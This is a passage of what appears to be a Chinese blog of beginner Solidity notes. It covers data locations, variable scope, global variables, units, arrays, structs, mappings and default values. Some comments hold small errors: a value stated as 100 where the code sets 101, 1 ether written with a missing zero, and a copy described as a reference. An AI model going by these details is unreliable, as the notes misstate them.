title="数据位置"></a>数据位置</h2><p>数据的位置包含三种类型<code>storage</code>,<code>memory</code>,<code>calldata</code></p><ul><li><p><code>storage</code>：合约里的状态变量默认是storage，存储在链上的，类似计算机的硬盘—一种持久化存储，由链帮你持久化，所以影响了链，所以消耗的gas比较大</p></li><li><p><code>memory</code>:函数里的参数和临时使用的变量一般用memory，见名知意，内存，存储在内存中的，不上链，尤其是当返回数据类型是<strong>变长</strong>的情况下，必须加memory修饰，例如：string,bytes，array和自定义结构，</p></li><li><p><code>calldata</code>：和<code>memory</code>类似，也是储存在内存中，不上链，不同点是不能修寒这个变量，一般用于函数的参数，入参进来后不会被改变：如</p></li><li><pre><code class="solidity">function fCallData(uint[] calldata _x)public pure returns (uint[] calldata) &#123;        // _x[0]=0; // 当你修改的时候，就会报错TypeError: Calldata arrays are read-only.        return (_x);    &#125;<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br><span class="hljs-meta">### 数据位置和赋值规则</span><br><br>赋值的本质是创建引用指向本土，因此修改本体或者是修改引用，变化可以被同步<br><br>- `storage`(合约的状态变量)赋值给本地`storage`（函数里的）时候，会创建引用，改变新变量会影响原来的变量。例如a<br><br>```solidity<br>    <span class="hljs-built_in">uint</span>[] x =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br>    <span class="hljs-function">function <span class="hljs-title">sStorage</span>() <span class="hljs-keyword">public</span></span> &#123;<br>        <span class="hljs-built_in">uint</span>[] storage xStorage = x; <span class="hljs-comment">// xStorage是uint[]类型，位置是storage，引用了x，当修改xStorage的时候，x也会被修改，</span><br>        xStorage[<span class="hljs-number">0</span>]=<span class="hljs-number">101</span>;<span class="hljs-comment">//当我们调用了Sstorage方法的时候就xStorage以及x的第1个元素改成100，</span><br>        <span class="hljs-comment">// 在debug的时候可以看到x的第1个元素一开是1 ，后面变成了100</span><br>        <br>    &#125;<br>    <span class="hljs-comment">// 为了更方便观察。写了一个getX方法来查询x的值，当调用了sStorage后x的第一个元素就变成了101了；</span><br>    <span class="hljs-function">function <span class="hljs-title">getX</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint</span>[] memory</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (x);<br>    &#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p><code>memory</code>赋值给<code>memory</code>，会创建引用，改变新变量会影响原变量。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br>uint[] y  =[1,2,3]; // 在函数之外定义的变量，默认就是stroage类型的，<br><br><br>function yMemory() public view &#123;<br>    uint[] memory ymemory = y; // y是storage类的，ymemory是引用了y，所以修改ymemory的时候不会修改到y<br>    ymemory[0]=101;<br>    <br>&#125;<br>// 我们调用getY的时候就会发现，其实yMemory方法并不能修改y的值，这就是引用<br>function getY() public view returns (uint[] memory)&#123;<br>    return (y);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>其他情况下，赋值创建的是本体的副本，即对二者之一的修改，并不会同步到另一方。这有时会涉及到开发中的问题，比如从<code>storage</code>中读取数据，赋值给<code>memory</code>，然后修改<code>memory</code>的数据，但如果没有将<code>memory</code>的数据赋值回<code>storage</code>，那么<code>storage</code>的数据是不会改变的。上面的例子就是指的其他情况，是storage 类型被memory类型改变，实际是改变不成功的</li><li>还有一种情况就是memory类型的被memory类型的修改，这个暂时还不知道怎么打印</li></ul><h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><p>前面收的storage和memory讨论的是变量存储的位置，以及引用的方式，就像理解指针和引用一样，下面来学变量的作用域，所谓所用域就是指这个变量在哪里可以用它</p><p><code>Solidity</code>中变量按作用域划分有三种，分别是状态变量（state variable），局部变量（local variable）和全局变量(global variable)</p><h3 id="1-状态变量"><a href="#1-状态变量" class="headerlink" title="1. 状态变量"></a>1. 状态变量</h3><p>状态变量是数据存储在链上的变量，所有合约内函数都可以访问，<code>gas</code>消耗高。状态变量在合约内、函数外声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Variables &#123;<br>     // 2.变量的作用域<br>    // 2.1 状态变量： 链上的变量：写在合约里面函数外面的变量，就是状态变量，在所有合约内函数都可以访问，同样gas的消耗也高<br>    uint public a=1;<br>    uint public b;<br>    string public z;// 这些变量都是状态变量，同时，这些变量会自带有get方法去查看他们的值，（数组没有自带get）<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以在函数里更改状态变量的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function foo() external&#123;<br>    // 可以在函数里更改状态变量的值<br>    x = 5;<br>    y = 2;<br>    z = &quot;0xAA&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2. 局部变量"></a>2. 局部变量</h3><p>局部变量是仅在函数执行过程中有效的变量，函数退出后，变量无效。局部变量的数据存储在内存里，不上链，<code>gas</code>低。局部变量在函数内声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> // 2.2 局部变量，这个就很好理解了，就是在函数内部定义的变量，只作用的函数内，出去了就没用啦<br>function bar() external pure returns(uint)&#123;<br>    uint xx = 1;<br>    uint yy = 3;<br>    uint zz = xx + yy;<br>    return(zz);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-全局变量"><a href="#3-全局变量" class="headerlink" title="3. 全局变量"></a>3. 全局变量</h3><p>全局变量是全局范围工作的变量，都是<code>solidity</code>预留关键字。他们可以在函数内不声明直接使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 2.3 全局变量，这里的全局变量和py不同，这里指的是solidity预留关键字的变量，他们可以在函数内不声明直接使用<br>   function global()external view returns(address,uint,bytes32,bytes memory)  &#123;<br>       address sender=msg.sender; // 发送者的地址，猜测应该是调用这个合约的人的地址,address是一种类型<br>       uint blockNum = block.number; // 当前区块高度？<br>       bytes32 bHash = blockhash(blockNum - 1); // 获取区块哈希<br>       bytes memory data=msg.data; //这个没用过 ,byte是类型，memory是位置<br>       return (sender,blockNum,bHash,data);<br>   &#125;<br></code></pre></td></tr></table></figure><p>下面是一些常用的全局变量，更完整的列表请看这个<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">链接</a>：</p><ul><li><code>blockhash(uint blockNumber)</code>: (<code>bytes32</code>) 给定区块的哈希值 – 只适用于最近的256个区块, 不包含当前区块。</li><li><code>block.coinbase</code>: (<code>address payable</code>) 当前区块矿工的地址</li><li><code>block.gaslimit</code>: (<code>uint</code>) 当前区块的gaslimit</li><li><code>block.number</code>: (<code>uint</code>) 当前区块的number</li><li><code>block.timestamp</code>: (<code>uint</code>) 当前区块的时间戳，为unix纪元以来的秒</li><li><code>gasleft()</code>: (<code>uint256</code>) 剩余 gas</li><li><code>msg.data</code>: (<code>bytes calldata</code>) 完整call data</li><li><code>msg.sender</code>: (<code>address payable</code>) 消息发送者 (当前 caller)</li><li><code>msg.sig</code>: (<code>bytes4</code>) calldata的前四个字节 (function identifier)</li><li><code>msg.value</code>: (<code>uint</code>) 当前交易发送的 <code>wei</code> 值</li><li><code>block.blobbasefee</code>: (<code>uint</code>) 当前区块的blob基础费用。这是Cancun升级新增的全局变量。</li><li><code>blobhash(uint index)</code>: (<code>bytes32</code>) 返回跟当前交易关联的第 <code>index</code> 个blob的版本化哈希（第一个字节为版本号，当前为<code>0x01</code>，后面接KZG承诺的SHA256哈希的最后31个字节）。若当前交易不包含blob，则返回空字节。这是Cancun升级新增的全局变量。</li></ul><h3 id="4-全局变量-以太单位与时间单位"><a href="#4-全局变量-以太单位与时间单位" class="headerlink" title="4. 全局变量-以太单位与时间单位"></a>4. 全局变量-以太单位与时间单位</h3><h4 id="以太单位"><a href="#以太单位" class="headerlink" title="以太单位"></a>以太单位</h4><p><code>Solidity</code>中不存在小数点，以<code>0</code>代替为小数点，来确保交易的精确度，并且防止精度的损失，利用以太单位可以避免误算的问题，方便程序员在合约中处理货币交易。</p><ul><li><code>wei</code>: 1</li><li><code>gwei</code>: 1e9 &#x3D; 1000000000</li><li><code>ether</code>: 1e18 &#x3D; 1000000000000000000</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 以太坊没有小数点，用0代替为小数点来确保交易的精度，为了防止精度的损失，利用一台单位可以避免误算，<br>  // wei : 1<br>  // gwei : 1e9 =1000000000<br>  // ether : 1e18 = 100000000000000000<br>  function weiUit()external pure returns(uint)  &#123;<br>      assert(1 wei ==1e0);<br>      assert(1 wei == 1);<br>      // return 1 wei; // 调用的时候就看到返回了1，<br>      return 1 gwei; // 试试看返回什么 返回 <br>  &#125;<br>  function gweiUit()external pure returns(uint)  &#123;<br>      assert(1 gwei ==1e9);<br>      assert(1 gwei == 1000000000); // 如果assert错误，调用的时候会报错的嘿嘿<br>      <br>      return 1 gwei; // 试试看返回什么 返回  1000000000<br>  &#125;<br>  function etherUit()external pure returns(uint)  &#123;<br>      assert(1 ether ==1e18);<br>      assert(1 ether == 1000000000000000000);<br>      // return 1 wei; // 调用的时候就看到返回了1，<br>      return 1 ether; // 试试看返回什么 返回  1000000000000000000<br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="时间单位"><a href="#时间单位" class="headerlink" title="时间单位"></a>时间单位</h4><p>可以在合约中规定一个操作必须在一周内完成，或者某个事件在一个月后发生。这样就能让合约的执行可以更加精确，不会因为技术上的误差而影响合约的结果。因此，时间单位在<code>Solidity</code>中是一个重要的概念，有助于提高合约的可读性和可维护性。</p><ul><li><code>seconds</code>: 1</li><li><code>minutes</code>: 60 seconds &#x3D; 60</li><li><code>hours</code>: 60 minutes &#x3D; 3600</li><li><code>days</code>: 24 hours &#x3D; 86400</li><li><code>weeks</code>: 7 days &#x3D; 604800</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function secondsUnit() external pure returns(uint) &#123;<br>    assert(1 seconds == 1);<br>    return 1 seconds;<br>&#125;<br><br>function minutesUnit() external pure returns(uint) &#123;<br>    assert(1 minutes == 60);<br>    assert(1 minutes == 60 seconds);<br>    return 1 minutes;<br>&#125;<br><br>function hoursUnit() external pure returns(uint) &#123;<br>    assert(1 hours == 3600);<br>    assert(1 hours == 60 minutes);<br>    return 1 hours;<br>&#125;<br><br>function daysUnit() external pure returns(uint) &#123;<br>    assert(1 days == 86400);<br>    assert(1 days == 24 hours);<br>    return 1 days;<br>&#125;<br><br>function weeksUnit() external pure returns(uint) &#123;<br>    assert(1 weeks == 604800);<br>    assert(1 weeks == 7 days);<br>    return 1 weeks;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这一讲，我们介绍了<code>Solidity</code>中的引用类型，数据位置和变量的作用域。重点是<code>storage</code>, <code>memory</code>和<code>calldata</code>三个关键字的用法。他们出现的原因是为了节省链上有限的存储空间和降低<code>gas</code>。下一讲我们会介绍引用类型中的数组。</p><h1 id="6-引用类型-array-struct"><a href="#6-引用类型-array-struct" class="headerlink" title="6. 引用类型, array, struct"></a>6. 引用类型, array, struct</h1><p>数组（<code>Array</code>）是<code>Solidity</code>常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）。数组分为固定长度数组和可变长度数组两种：</p><ul><li><p>固定长度数组：在声明时指定数组的长度。用<code>T[k]</code>的格式声明，其中<code>T</code>是元素的类型，<code>k</code>是长度，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 固定长度 Array<br>uint[8] array1;<br>bytes1[5] array2;<br>address[100] array3;<br></code></pre></td></tr></table></figure></li><li><p>可变长度数组（动态数组）：在声明时不指定数组的长度。用<code>T[]</code>的格式声明，其中<code>T</code>是元素的类型，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 可变长度 Array<br>uint[] array4;<br>bytes1[] array5;<br>address[] array6;<br>bytes array7;<br></code></pre></td></tr></table></figure><p><strong>注意</strong>：<code>bytes</code>比较特殊，是数组，但是不用加<code>[]</code>。另外，不能用<code>byte[]</code>声明单字节数组，可以使用<code>bytes</code>或<code>bytes1[]</code>。<code>bytes</code> 比 <code>bytes1[]</code> 省gas。</p></li></ul><h3 id="创建数组的规则"><a href="#创建数组的规则" class="headerlink" title="创建数组的规则"></a>创建数组的规则</h3><p>在Solidity里，创建数组有一些规则：</p><ul><li><p>对于<code>memory</code>修饰的<code>动态数组</code>，可以用<code>new</code>操作符来创建，但是必须声明长度，并且声明后长度不能改变。例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// memory动态数组<br>uint[] memory array8 = new uint[](5);<br>bytes memory array9 = new bytes(9);<br></code></pre></td></tr></table></figure></li><li><p>数组字面常数(Array Literals)是写作表达式形式的数组，用方括号包着来初始化array的一种方式，并且里面每一个元素的type是以第一个元素为准的，例如<code>[1,2,3]</code>里面所有的元素都是<code>uint8</code>类型，因为在Solidity中，如果一个值没有指定type的话，会根据上下文推断出元素的类型，默认就是最小单位的type，这里默认最小单位类型是<code>uint8</code>。而<code>[uint(1),2,3]</code>里面的元素都是<code>uint</code>类型，因为第一个元素指定了是<code>uint</code>类型了，里面每一个元素的type都以第一个元素为准。</p><p>下面的例子中，如果没有对传入 <code>g()</code> 函数的数组进行 <code>uint</code> 转换，是会报错的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: GPL-3.0<br>pragma solidity &gt;=0.4.16 &lt;0.9.0;<br><br>contract C &#123;<br>    function f() public pure &#123;<br>        g([uint(1), 2, 3]);<br>    &#125;<br>    function g(uint[3] memory _data) public pure &#123;<br>        // ...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>如果创建的是动态数组，你需要一个一个元素的赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint[] memory x = new uint[](3);<br>x[0] = 1;<br>x[1] = 3;<br>x[2] = 4;<br></code></pre></td></tr></table></figure></li></ul><h3 id="数组成员"><a href="#数组成员" class="headerlink" title="数组成员"></a>数组成员</h3><ul><li><code>length</code>: 数组有一个包含元素数量的<code>length</code>成员，<code>memory</code>数组的长度在创建后是固定的。</li><li><code>push()</code>: <code>动态数组</code>拥有<code>push()</code>成员，可以在数组最后添加一个<code>0</code>元素，并返回该元素的引用。</li><li><code>push(x)</code>: <code>动态数组</code>拥有<code>push(x)</code>成员，可以在数组最后添加一个<code>x</code>元素。</li><li><code>pop()</code>: <code>动态数组</code>拥有<code>pop()</code>成员，可以移除数组最后一个元素。</li></ul><h2 id="结构体-struct"><a href="#结构体-struct" class="headerlink" title="结构体 struct"></a>结构体 struct</h2><p><code>Solidity</code>支持通过构造结构体的形式定义新的类型。结构体中的元素可以是原始类型，也可以是引用类型；结构体可以作为数组或映射的元素。创建结构体的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 结构体<br>struct Student&#123;<br>    uint256 id;<br>    uint256 score; <br>&#125;<br><br>Student student; // 初始一个student结构体<br></code></pre></td></tr></table></figure><p>给结构体赋值的四种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//  给结构体赋值<br>// 方法1:在函数中创建一个storage的struct引用<br> // 4 结构体，顾名思义，各种数据类型组合的结构体，结构体中的元素可以是原始类型，也可以是引用类型；结构体可以作为数组或映射的元素。创建结构体的方法：<br>    struct Student&#123;<br>        uint256 id;<br>        uint256 score;<br>    &#125;<br>    Student student; // 舒适化这个结构体，待会下面会用到的<br>    // 4.1 方法1: 给结构体赋值方式一：<br>    function initStudent1()external  &#123;<br>        Student storage _student=student ;// storage状态变量，链上存储<br>        _student.id=11;<br>        _student.score=100; // debug的时候会发现，当程序走到这里的时候 student的属性发生了改变<br>    &#125;<br>    // 4.2 方法2:直接引用状态变量的struct<br>    function initStudent2() external&#123;   <br>        student.id = 1;<br>        student.score = 80;<br>    &#125;<br>    // 4.3 方法3:构造函数式，类似与类的初始化<br>    function initStudent3() external &#123;<br>        student = Student(3, 90);<br>    &#125;<br>    // 方法4:key value<br>    function initStudent4() external &#123;<br>        student =Student(<br>            &#123;<br>                id:4,<br>                score:50<br>            &#125;<br>        );<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="7-映射类型-mapping"><a href="#7-映射类型-mapping" class="headerlink" title="7. 映射类型 mapping"></a>7. 映射类型 mapping</h1><h2 id="映射Mapping"><a href="#映射Mapping" class="headerlink" title="映射Mapping"></a>映射Mapping</h2><p>在映射中，人们可以通过键（<code>Key</code>）来查询对应的值（<code>Value</code>），比如：通过一个人的<code>id</code>来查询他的钱包地址。</p><p>声明映射的格式为<code>mapping(_KeyType =&gt; _ValueType)</code>，其中<code>_KeyType</code>和<code>_ValueType</code>分别是<code>Key</code>和<code>Value</code>的变量类型。例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(uint =&gt; address) public idToAddress; // id映射到地址<br>mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址<br></code></pre></td></tr></table></figure><h2 id="映射的规则"><a href="#映射的规则" class="headerlink" title="映射的规则"></a>映射的规则</h2><p>​    &#x2F;&#x2F; 1、map 的key 只能是solidity 内置类型，值可以用自定义的结构体</p><p>​    &#x2F;&#x2F; 2、map的存储位置必须是storage 因此可以用于合约的状态变量、函数中的storage的变量和librry函数的参数</p><p>​    &#x2F;&#x2F; 但是不能用于public函数的啊参数或者返回值，因为map记录的是一种key-value的关系</p><p>​    &#x2F;&#x2F; 3、如果映射声明为public 那么solidity会自动为此变量创建一个getter函数来让你通过key来查询value</p><p>​    &#x2F;&#x2F; 4、增加键值对的语法为 ： Var[_Key] &#x3D; _Value,其中_Var是映射变量名，_Key和_Value对应新增的键值对</p><h2 id="映射的原理"><a href="#映射的原理" class="headerlink" title="映射的原理"></a>映射的原理</h2><ul><li><strong>原理1</strong>: 映射不储存任何键（<code>Key</code>）的资讯，也没有length的资讯。</li><li><strong>原理2</strong>: 对于映射使用<code>keccak256(h(key) . slot)</code>计算存取value的位置。感兴趣的可以去阅读 <a href="https://github.com/WTFAcademy/WTF-Solidity-Internals/tree/master/tutorials/02_MappingStorage">WTF Solidity 内部规则: 映射存储布局</a></li><li><strong>原理3</strong>: 因为Ethereum会定义所有未使用的空间为0，所以未赋值（<code>Value</code>）的键（<code>Key</code>）初始值都是各个type的默认值，如uint的默认值是0。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function writeMap(uint _Key,address _Value)public  &#123;<br>    idToAddress[_Key]=_Value;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="8-变量初始值"><a href="#8-变量初始值" class="headerlink" title="8. 变量初始值"></a>8. 变量初始值</h1><p>Solidity 和go 一样，声明但没赋值的变量都有它的初始值或者默认值，</p><h2 id="值类型变量的初始值"><a href="#值类型变量的初始值" class="headerlink" title="值类型变量的初始值"></a>值类型变量的初始值</h2><ul><li><p><code>boolean</code>: <code>false</code></p></li><li><p><code>string</code>: <code>&quot;&quot;</code></p></li><li><p><code>int</code>: <code>0</code></p></li><li><p><code>uint</code>: <code>0</code></p></li><li><p><code>enum</code>: 枚举中的第一个元素</p></li><li><p><code>address</code>: <code>0x0000000000000000000000000000000000000000</code> (或 <code>address(0)</code>)</p></li><li><pre><code class="hljs">function<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>  - `<span class="hljs-keyword">internal</span>`: 空白函数<br>  - `external`: 空白函数<br><br>可以用<span class="hljs-keyword">public</span>变量的getter函数验证初始值<br><br>```solidity<br>contract InitialValue &#123;<br>    <span class="hljs-built_in">bool</span> <span class="hljs-keyword">public</span> _bool;<br>    <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> _string;<br>    <span class="hljs-built_in">int</span> <span class="hljs-keyword">public</span> _int;<br>    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> _uint;<br>    address <span class="hljs-keyword">public</span> _address;<span class="hljs-comment">//0x0000000000000000000000000000000000000000</span><br>    <span class="hljs-function">function <span class="hljs-title">fi</span>()<span class="hljs-keyword">internal</span></span> &#123;&#125;<span class="hljs-comment">//fi 内部函数无法调用</span><br>    <span class="hljs-function">function <span class="hljs-title">fe</span>()external</span> &#123;&#125;<span class="hljs-comment">// 空白函数</span><br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul><h3 id="引用类型初始值"><a href="#引用类型初始值" class="headerlink" title="引用类型初始值"></a>引用类型初始值</h3><ul><li>映射<code>mapping</code>: 所有元素都为其默认值的<code>mapping</code></li><li>结构体<code>struct</code>: 所有成员设为其默认值的结构体</li><li>数组array<ul><li>动态数组: <code>[]</code></li><li>静态数组（定长）: 所有成员设为其默认值的静态数组</li></ul></li></ul><p>可以用<code>public</code>变量的<code>getter</code>函数验证上面写的初始值是否正确：</p><p><code>delete</code>操作符</p><p><code>delete a </code>会让变量<code>a</code>的值变为初始值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 3 delete操作符<br>bool public _bool2=true;<br>function fd()external &#123;<br>    delete _bool2;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="9-常数-constant和immutable"><a href="#9-常数-constant和immutable" class="headerlink" title="9. 常数 constant和immutable"></a>9. 常数 constant和immutable</h1><p><code>constant</code>:常数,</p><p><code>immutable</code>：不变量</p><p>只有数值类型的可以声明称constant 和 immutable ；</p><p><code>string</code>和<code>bytes</code>可以声明为constant 但不能为immutable;</p><p><code>constant</code>变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。</p><p><code>immutable</code>变量可以在声明时或构造函数中初始化，因此更加灵活。在<code>Solidity v0.8.21</code>以后，<code>immutable</code>变量不需要显式初始化，未显式初始化的<code>immutable</code>变量将使用数值类型的初始值（见 <a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/08_InitialValue/readme.md#%E5%8F%98%E9%87%8F%E5%88%9D%E5%A7%8B%E5%80%BC">8. 变量初始值</a>）。反之，则需要显式初始化。 若<code>immutable</code>变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Solidity笔记之一基础变量</title>
    <link href="/2025/04/22/08-1Solidity%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/22/08-1Solidity%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="先看总结"><a href="#先看总结" class="headerlink" title="先看总结"></a>先看总结</h1><p><img src="/img/web3/Solidity.png" alt="Solidity"></p><h1 id="Solidity中的变量类型"><a href="#Solidity中的变量类型" class="headerlink" title="Solidity中的变量类型"></a>Solidity中的变量类型</h1><ol><li>**值类型(Value Type)**：包括布尔型，整数型等等，这类变量赋值时候直接传递数值。</li><li>**引用类型(Reference Type)**：包括数组和结构体，这类变量占空间大，赋值时候直接传递地址（类似指针）。</li><li><strong>映射类型(Mapping Type)</strong>: Solidity中存储键值对的数据结构，可以理解为哈希表</li></ol><p>我们将仅介绍常用类型，不常用的类型不会涉及，本篇将介绍值类型。</p><h1 id="2-值类型"><a href="#2-值类型" class="headerlink" title="2. 值类型"></a>2. 值类型</h1><h3 id="1-布尔型"><a href="#1-布尔型" class="headerlink" title="1. 布尔型"></a>1. 布尔型</h3><p>布尔型是二值变量，取值为 <code>true</code> 或 <code>false</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 布尔值<br>bool public _bool = true; <br>//类型 公有 值名称=值<br></code></pre></td></tr></table></figure><p>布尔值的运算符包括：</p><ul><li><code>!</code> （逻辑非）</li><li><code>&amp;&amp;</code> （逻辑与，”and”）</li><li><code>||</code> （逻辑或，”or”）</li><li><code>==</code> （等于）</li><li><code>!=</code> （不等于）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 布尔运算<br>bool public _bool1 = !_bool; // 取非<br>bool public _bool2 = _bool &amp;&amp; _bool1; // 与<br>bool public _bool3 = _bool || _bool1; // 或<br>bool public _bool4 = _bool == _bool1; // 相等<br>bool public _bool5 = _bool != _bool1; // 不相等<br></code></pre></td></tr></table></figure><p>在上述代码中：变量 <code>_bool</code> 的取值是 <code>true</code>；<code>_bool1</code> 是 